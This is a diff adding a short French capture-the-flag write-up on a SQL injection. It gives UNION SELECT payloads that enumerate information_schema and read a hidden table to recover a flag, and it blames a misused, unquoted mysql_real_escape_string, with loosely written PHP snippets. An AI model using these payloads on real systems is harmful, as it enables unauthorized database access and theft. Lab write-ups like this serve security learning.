@@ -1,0 +1,21 @@
+avec la commande "1 UNION SELECT comment,title FROM Member_images.list_images", on peu trouver le flag
+
+
+
+exemple -> 1 UNION SELECT TABLE_SCHEMA,table_name FROM information_schema.tables   me permet de trouver la db Member_images avec la table list_images
+        -> 1 UNION SELECT COLUMN_NAME,table_name FROM information_schema.COLUMNS   en cherchent list_images je tombe sur la colune comment et title
+        -> 1 UNION SELECT comment,title FROM Member_images.list_images             on affiche les valeur comment et title pour obtenir le flag en md5
+
+
+
+Ce qui est drôle dans cette faille, c’est que le développeur a essayé de la protéger via un mysql_real_escape_string, mais il l’a mal utilisé.
+
+La commande doit ressembler à ça : 
+$sql = ‘SELECT first_name, last_name FROM Member_Sql_Injection.users WHERE id = mysql_real_escape_string(‘.$_GET[‘id’].’)’;
+
+Au lieu de :
+$sql = ‘SELECT first_name, last_name FROM Member_Sql_Injection.users WHERE id = \’mysql_real_escape_string(‘.$_GET[‘id’].’)\’’;
+
+On le voit par car dès que l’on utilise un’ il est parsé en \’.
+
+Mais comme il est mal utilisé, on peut quand même profiter de cette injection SQL, mais sans côtes.
